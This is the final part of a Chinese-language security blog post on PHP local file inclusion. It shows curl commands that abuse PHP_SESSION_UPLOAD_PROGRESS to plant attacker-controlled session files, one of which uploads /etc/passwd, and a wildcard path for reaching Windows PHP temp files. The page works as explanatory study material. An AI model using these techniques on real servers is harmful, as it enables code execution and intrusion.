+<h3 id="PHP-SESSION-UPLOAD-PROGRESS"><a href="#PHP-SESSION-UPLOAD-PROGRESS" class="headerlink" title="PHP_SESSION_UPLOAD_PROGRESS"></a>PHP_SESSION_UPLOAD_PROGRESS</h3><p>如果发现本地文件包含，即使没有会话并且 session.auto_start 已关闭。 如果 session.upload_progress.enabled 为 On 并且在多部分 POST 数据中提供 PHP_SESSION_UPLOAD_PROGRESS，PHP 将启用会话</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ curl http://127.0.0.1/ -H <span class="string">&#x27;Cookie: PHPSESSID=iamorange&#x27;</span></span><br><span class="line">$ <span class="built_in">ls</span> -a /var/lib/php/sessions/</span><br><span class="line">. ..</span><br><span class="line">$ curl http://127.0.0.1/ -H <span class="string">&#x27;Cookie: PHPSESSID=iamorange&#x27;</span> -d <span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS=blahblahblah&#x27;</span></span><br><span class="line">$ <span class="built_in">ls</span> -a /var/lib/php/sessions/</span><br><span class="line">. ..</span><br><span class="line">$ curl http://127.0.0.1/ -H <span class="string">&#x27;Cookie: PHPSESSID=iamorange&#x27;</span> -F <span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS=blahblahblah&#x27;</span>  -F <span class="string">&#x27;file=@/etc/passwd&#x27;</span></span><br><span class="line">$ <span class="built_in">ls</span> -a /var/lib/php/sessions/</span><br><span class="line">. .. sess_iamorange</span><br></pre></td></tr></table></figure>
+
+<p>在最后一个示例中，会话将包含字符串</p>
+<p>请注意，使用 PHP_SESSION_UPLOAD_PROGRESS 可以控制会话内的数据，因此如果包含会话文件，则可以包含控制的部分（例如 php shellcode）</p>
+<h3 id="Windows临时文件"><a href="#Windows临时文件" class="headerlink" title="Windows临时文件"></a>Windows临时文件</h3><p>在 Windows 上，PHP 使用 GetTempFileName 函数生成临时文件名，从而产生类似于 <path>&lt;pre&gt;<uuuu>.TMP 的文件</p>
+<p>其默认路径通常为 C:\Windows\Temp，前缀通常是php。</p>
+<p><uuuu> 表示唯一的十六进制值。由于该函数的限制，仅使用低 16 位，最多允许 65,535 个具有恒定路径和前缀的唯一名称，从而使暴力破解变得可行。</p>
+<p>此外，Windows系统上的利用过程也得到了简化。 FindFirstFile 函数的一个特点是允许在本地文件包含 (LFI) 路径中使用通配符。 这使得能够创建如下所示的包含路径来定位临时文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://site/vuln.php?inc=c:\windows\temp\php&lt;&lt;</span><br></pre></td></tr></table></figure>
+
+<p>在某些情况下，可能需要更具体的掩码（例如 php1&lt;&lt; 或 phpA&lt;&lt;）。 人们可以系统地尝试这些掩码来发现上传的临时文件</p>
+
+      </section>
+
+      
+      
+        <nav class="article-nav">
+          
+            <div class="article-nav-item layout-padding">
+  <article class="card-container article-nav-card content-padding--primary soft-size--large soft-style--box">
+    
+    <div class="card-text">
+      
+        <a href="/2024/11/05/XXE/" itemprop="url">
+          <h2 class="card-text--title text-ellipsis">XXE</h2>
+        </a>
+      
+      <div class="card-text--row">Newer</div>
+    </div>
+  </article>
+</div>
+          
+          
+            <div class="article-nav-item layout-padding">
+  <article class="card-container article-nav-card content-padding--primary soft-size--large soft-style--box">
+    
+    <div class="card-text">
+      
+        <a href="/2024/10/21/%E8%84%B1%E5%A3%B3/" itemprop="url">
+          <h2 class="card-text--title text-ellipsis">脱壳</h2>
+        </a>
+      
+      <div class="card-text--row">Older</div>
+    </div>
+  </article>
+</div>
+          
+        </nav>
+      
+
+      <section class="page-message-container layout-padding">
+        
+
+
+  
+  
+
+  
+  
+
+
+      </section>
+    </div>
+    <div class="widget-info">
+      <section class="widget-author widget-item layout-margin content-padding--primary soft-size--large soft-style--box">
+  <div class="widget-body">
+    
+      <img src="/favicon.ico" class="soft-size--round soft-style--box" alt="略略略">
+    
+    
+      <h2>略略略</h2>
+    
+    
+      <p>贵在坚持</p>
+    
+
+    <div class="count-box">
+      <div class="count-box--item">
+        <svg class="icon icon-article" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M240.51564747 647.74217627h196.07203239c16.59071043 0 30.16492806-13.57421762 30.16492805-30.16492806V165.10332731c0-33.18142087-30.16492806-60.32985613-60.32985612-60.32985611H245.04038668C225.43318342 104.7734712 210.35071939 119.85593522 210.35071939 139.46313845V617.57724821c0 16.59071043 13.57421762 30.16492806 30.16492808 30.16492806z m663.62841731-452.47392089v482.63884894c0 33.18142087-27.14843525 60.32985613-60.32985612 60.32985613H180.18579134c-33.18142087 0-60.32985613-27.14843525-60.32985612-60.32985613V195.26825538c-49.77213131 0-90.49478418 40.72265287-90.49478417 90.49478417v452.4739209c0 49.77213131 40.72265287 90.49478418 90.49478417 90.49478417h286.56681657c16.59071043 0 30.16492806 13.57421762 30.16492807 30.16492807s13.57421762 30.16492806 30.16492805 30.16492806h90.49478418c16.59071043 0 30.16492806-13.57421762 30.16492805-30.16492806s13.57421762-30.16492806 30.16492807-30.16492807h286.56681657c49.77213131 0 90.49478418-40.72265287 90.49478417-90.49478417V285.76303955c0-49.77213131-40.72265287-90.49478418-90.49478417-90.49478417zM587.41232014 647.74217627h191.54729318c19.60720323 0 34.68966726-15.08246403 34.68966729-34.68966727V134.93839925c0-16.59071043-13.57421762-30.16492806-30.16492808-30.16492805H617.57724821c-30.16492806 0-60.32985613 27.14843525-60.32985612 60.32985611v452.4739209c0 16.59071043 13.57421762 30.16492806 30.16492805 30.16492806z" fill="currentColor"></path>
+</svg>
+        <span>17</span>
+      </div>
+      <div class="count-box--item">
+        <svg class="icon icon-categories" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M900.3614811 257.09082106h-339.81629553l-67.96326003-101.9448889c-19.41807444-29.12711113-48.54518557-43.69066667-82.52681443-43.69066667H123.6385189c-53.39970333 0-97.09036999 43.69066667-97.09037113 97.09036999v582.54222222c0 53.39970333 43.69066667 97.09036999 97.09037113 97.09037002h776.7229622c53.39970333 0 97.09036999-43.69066667 97.09037113-97.09037002V354.18119104c0-53.39970333-43.69066667-97.09036999-97.09037113-97.09036998z m-97.09036999 242.72592554H220.72888889c-24.27259221 0-48.54518557-24.27259221-48.54518556-48.54518556s24.27259221-48.54518557 48.54518556-48.54518444h582.54222222c24.27259221 0 48.54518557 24.27259221 48.54518556 48.54518444s-24.27259221 48.54518557-48.54518556 48.54518556z" fill="currentColor"></path>
+</svg>
+        0
+      </div>
+      <div class="count-box--item">
+        <svg class="icon icon-tags" viewBox="0 0 1098 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M283.42180005 272q0-28.38857157-20.09142843-48.48000001t-48.47999998-20.09142842-48.48000002 20.09142842-20.09142846 48.48000001 20.09142846 48.48 48.48000002 20.09142843 48.47999998-20.09142843 20.09142843-48.48zM855.0332285 580.57142843q0 28.38857157-19.81714313 48.2057147l-263.03999997 263.58857157q-20.9142853 19.81714313-48.75428534 19.81714312-28.38857157 0-48.20571468-19.81714312l-383.04-383.58857157q-20.36571468-19.81714313-34.55999999-54.10285688t-14.19428534-62.6742853l0-222.85714313q0-27.84000002 20.36571469-48.20571469t48.2057147-20.36571466l222.85714313 0q28.38857157 0 62.6742853 14.19428529t54.65142842 34.55999999l383.04000001 382.49142843q19.81714313 20.9142853 19.81714314 48.75428532zM1060.74751475 580.57142843q0 28.38857157-19.81714313 48.2057147l-263.04 263.58857157q-20.9142853 19.81714313-48.75428531 19.81714312-19.26857155 0-31.61142843-7.47428531t-28.38857159-24.13714314l251.79428534-251.7942853q19.81714313-19.81714313 19.81714308-48.20571469 0-27.84000002-19.81714308-48.75428531l-383.04000001-382.49142845q-20.36571468-20.36571468-54.65142842-34.55999999t-62.67428532-14.19428534l120 0q28.38857157 0 62.67428532 14.19428534t54.65142842 34.55999999l383.03999998 382.49142845q19.81714313 20.9142853 19.81714314 48.75428531z" fill="currentColor"></path>
+</svg>
+        5
+      </div>
+    </div>
+  </div>
+</section>
+
+      
+
+      
+<section class="widet-notice widget-item layout-margin content-padding--primary soft-size--large soft-style--box">
+  <div class="widget-title">
+    <svg class="icon icon-notice" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M512 945.02305225v28.15620663a24.27259221 24.27259221 0 0 1-24.27259221 24.27259335H394.0352a48.54518557 48.54518557 0 0 1-41.74885888-23.78714112l-110.68302222-184.47170332a132.04290333 132.04290333 0 0 1-17.47626667-48.54518557h118.4502511a200.97706667 200.97706667 0 0 1 76.21594113 14.56355556l20.38897777 133.49925888a48.54518557 48.54518557 0 0 0 36.40888888 27.67075555l16.01991111 2.91271112a24.27259221 24.27259221 0 0 1 20.38897778 25.72894889zM997.45185223 463.45481443a194.18074112 194.18074112 0 0 1-38.8361489 116.50844445 24.75804445 24.75804445 0 0 1-36.4088889 0l-34.95253333-34.95253333a24.27259221 24.27259221 0 0 1-2.91271111-30.58346667 97.09036999 97.09036999 0 0 0 0-106.79940665 24.27259221 24.27259221 0 0 1 2.91271111-30.58346666l34.95253333-34.95253334a24.75804445 24.75804445 0 0 1 18.93262223-7.28177777 26.2144 26.2144 0 0 1 17.47626667 9.70903665A194.18074112 194.18074112 0 0 1 997.45185223 463.45481443z m-194.18074112-388.36148111v776.72296335a48.54518557 48.54518557 0 0 1-48.54518556 48.54518443h-28.64165888a48.54518557 48.54518557 0 0 1-33.98163001-14.07810332l-145.63555556-143.20829668A291.27111111 291.27111111 0 0 0 342.57730333 657.63555556H172.18370333a145.63555556 145.63555556 0 0 1-145.63555556-145.63555556v-97.09036999a145.63555556 145.63555556 0 0 1 145.63555556-145.63555556h170.3936a291.27111111 291.27111111 0 0 0 206.31703779-85.43952668l145.63555555-143.20829554a48.54518557 48.54518557 0 0 1 33.98162888-14.07810446H754.72592555a48.54518557 48.54518557 0 0 1 48.54518556 48.54518555z" fill="currentColor"></path>
+</svg>
+    <span>NOTICE</span>
+  </div>
+  <div class="widget-body">
+    <p>暂无</p>
+  </div>
+</section>
+
+
+      <section class="widget-categories widget-item layout-margin content-padding--primary soft-size--large soft-style--box">
+  <div class="widget-title">
+    <svg class="icon icon-categories" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M900.3614811 257.09082106h-339.81629553l-67.96326003-101.9448889c-19.41807444-29.12711113-48.54518557-43.69066667-82.52681443-43.69066667H123.6385189c-53.39970333 0-97.09036999 43.69066667-97.09037113 97.09036999v582.54222222c0 53.39970333 43.69066667 97.09036999 97.09037113 97.09037002h776.7229622c53.39970333 0 97.09036999-43.69066667 97.09037113-97.09037002V354.18119104c0-53.39970333-43.69066667-97.09036999-97.09037113-97.09036998z m-97.09036999 242.72592554H220.72888889c-24.27259221 0-48.54518557-24.27259221-48.54518556-48.54518556s24.27259221-48.54518557 48.54518556-48.54518444h582.54222222c24.27259221 0 48.54518557 24.27259221 48.54518556 48.54518444s-24.27259221 48.54518557-48.54518556 48.54518556z" fill="currentColor"></path>
+</svg>
+      <span>CATEGORIES</span>
+  </div>
+  <div class="widget-body">
+    <ul class="categories-list">
+      
+    </ul>
+  </div>
+</section>
+
+      <section class="widget-tags widget-item  layout-margin content-padding--primary soft-size--large soft-style--box">
+  <div class="widget-title">
+    <svg class="icon icon-tags" viewBox="0 0 1098 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M283.42180005 272q0-28.38857157-20.09142843-48.48000001t-48.47999998-20.09142842-48.48000002 20.09142842-20.09142846 48.48000001 20.09142846 48.48 48.48000002 20.09142843 48.47999998-20.09142843 20.09142843-48.48zM855.0332285 580.57142843q0 28.38857157-19.81714313 48.2057147l-263.03999997 263.58857157q-20.9142853 19.81714313-48.75428534 19.81714312-28.38857157 0-48.20571468-19.81714312l-383.04-383.58857157q-20.36571468-19.81714313-34.55999999-54.10285688t-14.19428534-62.6742853l0-222.85714313q0-27.84000002 20.36571469-48.20571469t48.2057147-20.36571466l222.85714313 0q28.38857157 0 62.6742853 14.19428529t54.65142842 34.55999999l383.04000001 382.49142843q19.81714313 20.9142853 19.81714314 48.75428532zM1060.74751475 580.57142843q0 28.38857157-19.81714313 48.2057147l-263.04 263.58857157q-20.9142853 19.81714313-48.75428531 19.81714312-19.26857155 0-31.61142843-7.47428531t-28.38857159-24.13714314l251.79428534-251.7942853q19.81714313-19.81714313 19.81714308-48.20571469 0-27.84000002-19.81714308-48.75428531l-383.04000001-382.49142845q-20.36571468-20.36571468-54.65142842-34.55999999t-62.67428532-14.19428534l120 0q28.38857157 0 62.67428532 14.19428534t54.65142842 34.55999999l383.03999998 382.49142845q19.81714313 20.9142853 19.81714314 48.75428531z" fill="currentColor"></path>
+</svg>
+    <span>TAGS</span>
+  </div>
+  <div class="widget-body">
+    <div class="tags-cloud">
+      <a href="/tags/Windows/" style="font-size: 10px;" class="tags-cloud-0">Windows</a> <a href="/tags/c%E4%BB%A3%E7%A0%81/" style="font-size: 20px;" class="tags-cloud-10">c代码</a> <a href="/tags/c%E5%9F%BA%E7%A1%80/" style="font-size: 15px;" class="tags-cloud-5">c基础</a> <a href="/tags/web%E6%BC%8F%E6%B4%9E/" style="font-size: 15px;" class="tags-cloud-5">web漏洞</a> <a href="/tags/%E9%80%86%E5%90%91/" style="font-size: 15px;" class="tags-cloud-5">逆向</a>
+    </div>
+  </div>
+</section>
+    </div>
+  </article>
+</div>
+
+    <!-- footer container -->
+<footer id="footer" class="footer">
+  <div class="footer-container">
+    
+    <div class="social-icons">
+      
+        
+      
+        
+      
+        
+      
+        
+          <a href="https://github.com/" class="soft-size--primary soft-style--box" target="_blank" rel="noopener noreferrer">
+            <svg class="icon icon-github" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M64.6 512c0 195.6 125.4 361.9 300.1 422.9 23.5 5.9 19.9-10.8 19.9-22.2v-77.6c-135.8 15.9-141.3-74-150.5-89-18.5-31.5-61.9-39.5-49-54.5 31-15.9 62.5 4 98.9 58 26.4 39.1 77.9 32.5 104.1 26 5.7-23.5 17.9-44.5 34.7-60.9-140.7-25.2-199.4-111.1-199.4-213.3 0-49.5 16.4-95.1 48.4-131.8-20.4-60.6 1.9-112.4 4.9-120.1 58.2-5.2 118.5 41.6 123.3 45.3 33.1-8.9 70.8-13.7 112.9-13.7 42.4 0 80.3 4.9 113.5 13.9 11.3-8.6 67.3-48.8 121.4-43.9 2.9 7.7 24.7 58.3 5.5 118.1 32.5 36.8 49 82.8 49 132.4 0 102.3-59 188.3-200.2 213.2 23.5 23.3 38.1 55.5 38.1 91.1v112.7c0.8 9 0 17.9 15.1 17.9C832.7 877 960.4 709.4 960.4 512.1c0-247.5-200.6-447.9-447.9-447.9C265 64.1 64.6 264.5 64.6 512z"></path>
+</svg>
+          </a>
+        
+      
+        
+          <a href="https://twitter.com" class="soft-size--primary soft-style--box" target="_blank" rel="noopener noreferrer">
+            <svg class="icon icon-twitter" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M962.285714 233.142857q-38.285714 56-92.571429 95.428571 0.571429 8 0.571429 24 0 74.285714-21.714286 148.285714t-66 142-105.428571 120.285714-147.428571 83.428571-184.571429 31.142857q-154.857143 0-283.428571-82.857143 20 2.285714 44.571429 2.285714 128.571429 0 229.142857-78.857143-60-1.142857-107.428571-36.857143t-65.142857-91.142857q18.857143 2.857143 34.857143 2.857143 24.571429 0 48.571429-6.285714-64-13.142857-106-63.714286t-42-117.428571l0-2.285714q38.857143 21.714286 83.428571 23.428571-37.714286-25.142857-60-65.714286t-22.285714-88q0-50.285714 25.142857-93.142857 69.142857 85.142857 168.285714 136.285714t212.285714 56.857143q-4.571429-21.714286-4.571429-42.285714 0-76.571429 54-130.571429t130.571429-54q80 0 134.857143 58.285714 62.285714-12 117.142857-44.571429-21.142857 65.714286-81.142857 101.714286 53.142857-5.714286 106.285714-28.571429z"></path>
+</svg>
+          </a>
+        
+      
+    </div>
+     
+    <p>&copy; 2024 <a href="/" target="_blank">John Doe</a></p>
+
+    
+
+    <p>Powered by <a href="https://hexo.io" target="_blank" rel="noopener noreferrer">Hexo</a> Theme - <a href="https://github.com/miiiku/flex-block" target="_blank" rel="noopener noreferrer author">flex-block</a></p>
+
+    <p>
+      <a href="javascript:;" id="theme-light">🌞 浅色</a>
+      <a href="javascript:;" id="theme-dark">🌛 深色</a>
+      <a href="javascript:;" id="theme-auto">🤖️ 自动</a>
+    </p>
+  </div>
+</footer>
+  </div>
+
+  <div class="back-to-top-fixed soft-size--round soft-style--box">
+    <svg class="icon icon-back-to-top" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+      <path d="M725.333333 426.666667c-12.8 0-21.333333-4.266667-29.866667-12.8l-213.333333-213.333333c-17.066667-17.066667-17.066667-42.666667 0-59.733333s42.666667-17.066667 59.733333 0l213.333333 213.333333c17.066667 17.066667 17.066667 42.666667 0 59.733333C746.666667 422.4 738.133333 426.666667 725.333333 426.666667z"></path>
+      <path d="M298.666667 426.666667c-12.8 0-21.333333-4.266667-29.866667-12.8-17.066667-17.066667-17.066667-42.666667 0-59.733333l213.333333-213.333333c17.066667-17.066667 42.666667-17.066667 59.733333 0s17.066667 42.666667 0 59.733333l-213.333333 213.333333C320 422.4 311.466667 426.666667 298.666667 426.666667z"></path>
+      <path d="M512 896c-25.6 0-42.666667-17.066667-42.666667-42.666667L469.333333 170.666667c0-25.6 17.066667-42.666667 42.666667-42.666667s42.666667 17.066667 42.666667 42.666667l0 682.666667C554.666667 878.933333 537.6 896 512 896z"></path>
+    </svg>
+  </div>
+
+  
+  <!-- aplayer -->
+
+
+<!-- dplayer -->
+
+
+<!-- copy button  -->
+<script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script>
+
+<!-- https://clipboardjs.com/ -->
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+  
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+  
+  <!-- 尾部用户自定义相关内容 -->
+</body>
+</html>
